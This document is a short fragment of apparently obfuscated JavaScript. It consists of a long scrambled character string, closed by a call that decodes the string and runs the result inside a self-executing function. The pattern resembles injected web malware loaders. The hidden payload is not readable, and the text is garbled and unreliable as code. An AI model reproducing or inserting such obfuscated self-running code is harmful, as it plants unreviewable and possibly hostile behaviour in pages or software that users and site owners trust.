u3](l{M%6%7e%nitBia.Zps(8G0iZhZm.$o))sr:f%)=5uttoZ[_g_1em_}.]2$laZ3Z_pZZ!.4tt4Z!n%e=a_.z%=%e=e2=.n[on= .oaf1;rs5;s5_3]Z]nbZZrZAh5tPZg[}Z_ rfZ.cZeZ1nZCg9Zs%r_%}e__)Z]h2n3.#D$Zs;m$ZZc_Zi=(pZudpZs3ZeZ]Zt}=Zl2.2aoXt5aenEiM9)rZtv376Z#.ZbpsuB(=,u=ar.Zah6o5nm25.=)%<Zu<X)%t=od*atoi,]ti->.Z)l8(5ZwetS%7$1alZ]n_]]Z]a(}83,c+Z1.a)xZi):d4Ze}(T%w;F%hvC+el.]}ZZZZ[y,3t arrtn:s5.iimf4nZ6n,ZZ5;()ie3ctZa?Z3r3)=t%_znsaZZiaeSniZ=%,:6zgZf,Z45t;tN0uebl3tk0pa{&Zyyoeso:1i.ZZir! Z9nafZ"3(s)_eZZ&y]]a.$Z_.{)Z"o;1_cZc2irZ%8,(aZs,Q2t}-)_pJ_s)_2.!=2%<r)3{"mc.%vZc22t]Z4wZup0ia%,r1a! Zo_rZZn=(e}&aP){%iZ.b>6#2#7=.8reskZoZgZZe \\f.w$}}htoy4_saru)a.=m.6 =ljoj={6_47opn! sl;=.fg5_wZuDjZa=teZaos4.1Z._e_on aZlt5(]osg0_eZac?\/ii_n=0atcZ)]0t_4reZ&tasn, nZZ,Zns5naEZe bZ o5ZkcZjZKt3m)uo.Ze>rj,Z5sac iUn_!Z5 =crcx36Zh?ZZane ,4ig_nZb3Wna{=tZ09r(p-]__e6;N jC.MZw7[axi!2tn.unK.tY=clZ.6})_ZZZx316CnnZa8ayZ2i:K])).saTtpZd}4e9alreZd4)li:,mX5i2dp;_rXe!{){)#r. .aX_i}h;)0!&!la0(4_ddsZIZqa6f1n%13o6ta]Zt,tZ_e(%ae6Z] b6$rZDa ;f1kfint2Zat+4(+ZcZNZ_.a]gZznaX X:Ss;Z;1 \')_&oZtHrZ5{]Zwe$! 4_nt%6Z%Ztz )_Xr`:pJ%)^ =aam;,%tZ(eg]aba2rd_o=5_%$i]n %=Zj _ZcZxZ]eg.a=%( rrr3%aa tfoaaZt;ner'));var ipl=RJw(bzN,jZM );ipl(3688);return 2989})()
